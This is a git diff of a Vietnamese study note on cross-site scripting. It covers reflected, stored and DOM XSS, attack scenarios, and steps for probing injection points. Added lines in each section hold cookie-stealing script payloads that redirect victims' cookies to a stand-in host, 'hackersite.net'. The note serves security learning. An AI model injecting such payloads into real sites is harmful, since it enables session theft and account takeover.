@@ -1,3 +1,4 @@
+**Task4** <br>
 - Tìm hiểu XSS và các loại tấn công XSS (XSS là gì, tại sao lại xảy ra lỗi, các loại tấn công phổ biến, cách khai thác + một số cách bypass mà em biết, cách ngăn chặn)
 - Dựng lại lab: 3 loại XSS (Reflected, Stored, DOM) <br>
 Yêu cầu: Viết lý thuyết lổ hổng 1 cách chi tiết.
@@ -22,7 +23,14 @@ https://insecure-website.com/status?message=All+is+well.
 https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
 <p>Status: <script>/* Bad stuff here... */</script></p>
 ```
-Khi người dùng truy cập vào một URL có chứa đoạn mã độc. Khi đó trình duyệt sẽ gửi yêu cầu đến server và server trả về trang web kèm tham số được truyền trên URL. Từ đó, các tham số chứa mã độc đó được thực thi trên trình duyệt người dùng.
+Khi người dùng truy cập vào một URL có chứa đoạn mã độc. Khi đó trình duyệt sẽ gửi yêu cầu đến server và server trả về trang web kèm tham số được truyền trên URL. Từ đó, các tham số chứa mã độc đó được thực thi trên trình duyệt người dùng. <br>
+
+**Kịch bản khai thác** <br>
+- Khi người dùng đăng nhập vào trang web và được gắn với một cookie.
+- Kẻ tấn công sẽ tạo ra 1 web có thể nhận được phản hồi ví dụ: `http://hackersite.net` và bằng 1 cách nào đó gửi cho nạn nhân  1 đường link `www.abcd.com?search=<script>window.location="http://hackersite.net?c="+document.cookie</script>`.
+- Khi nạn nhân bị lừa click vào link và khi đó cookie của nạn nhân gắn vào link đó và truy cập vào site của kẻ tấn công.
+- Kẻ tấn công khi ấy sẽ xem log của site và lấy được cookie của nạn nhân qua đó có thể truy cập vào tài khoản và thực hiện nhiều hành động khác.
+
 ### Mức độ của tấn công
 Kẻ tấn công có thể kiểm soát được tập lệnh thực thi của trình duyệt người dùng. Ngoài ra có thể:
 - Thực hiện hành động trong ứng dụng mà người dùng thực hiện được:
@@ -37,13 +45,17 @@ POST /post/comment HTTP/1.1
 Host: vulnerable-website.com
 Content-Length: 100
 
-postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
+postId=3&comment=This+post+was+extremely+helpful.
 ```
 Sau khi gửi thành công, bất kỳ người dùng nào cũng có thể thấy được comment và phản hồi dưới dạng:
 ```
 <p>This post was extremely helpful.</p>
 ```
-Khi ứng dụng không có xử lý khác, kẻ tấn công sẽ chèn mã độc vào comment đó, khi đó bất kỳ người dùng nào truy cập vào blog đó thì ứng dụng sẽ thực thi mã độc.
+Khi ứng dụng không có xử lý khác, kẻ tấn công sẽ chèn mã độc vào comment đó, khi đó bất kỳ người dùng nào truy cập vào blog đó thì ứng dụng sẽ thực thi mã độc. <br>
+**Kịch bản khai thác** <br>
+- Giả sử khi đó kẻ tấn công chèn mã độc vào bình luận để tải lên:
+```<script>window.location("http://hackersite.net?c="+document.cookie)</script>```
+- Khi có người dùng truy cập vào đúng bài viết có bình luận này thì trình duyệt người dùng thực thi mã độc trên và cookie sẽ đến được với kẻ tấn công.
 #### Mức độ của tấn công
 - Kẻ tấn công có thể thực hiện bất cứ hành động nào mà nạn nhân thực hiện được như cuộc tấn công Reflected XSS.
 - Điểm khác biệt giữa Stored XSS với Reflected XSS là cuộc tấn công này xảy ra trong chính ứng dụng web đó. Ngoài ra kẻ tấn công không phải tìm cách cho nạn nhân thực hiện hành động mới có thể khai thác được mà ở đây bất kỳ nạn nhân trong ứng dụng gặp phải mã độc đó. Với Stored XSS, kẻ tấn công dễ dàng đạt được mục đích hơn vì nạn nhân bị tấn công thì chắc chắn khi đó người dùng đã login và trong phiên làm việc(session) của web.
@@ -58,11 +70,18 @@ document.getElementById("search_results").innerHTML = "Result of " + username
 Trong trường hợp này, kẻ tấn công sẽ chèn mã độc vào trường tìm kiếm và nhập tên người dùng sau:
 ```
 <script>
-  window.location="http://[hacker site]?c="+document.cookie
+  window.location="http://hackersite.net?c="+document.cookie
 </script>
 ```
 Khi trình duyệt thực hiện mã độc này sẽ chuyển hướng đến site của hacker kèm cookie và khi đó kẻ tấn công có được cookie và sử dụng với mục đích xấu.
 #### Mức độ của tấn công
 Giống với các cuộc tấn công khác của XSS, kẻ tấn công có thể ăn căp thông tin quan trọng người dùng, thực hiện các hành động khác ... 
+## Cách khai thác và bypass
+- Tìm kiếm và quan sát các đầu vào như ô tìm kiếm, form, URL, parameters, HTTP header, ... nơi mà kẻ tấn công chèn có thể chèn mã độc.
+- Sau đó kẻ tấn công sẽ kiểm tra đầu vào bằng một số ký tự, các tag của html, scripts... rồi xem xét phản hồi nhận được. Test các phương thức trong js xem cách trình duyệt xử lý như `alert()`, `prompt()`.
+- Từ đó xác định nó thuộc loại lỗ hổng XSS nào rồi khai thác như phần trên theo từng loại.
+
+### Một số kỹ thuật và cách bypass
+
 
 
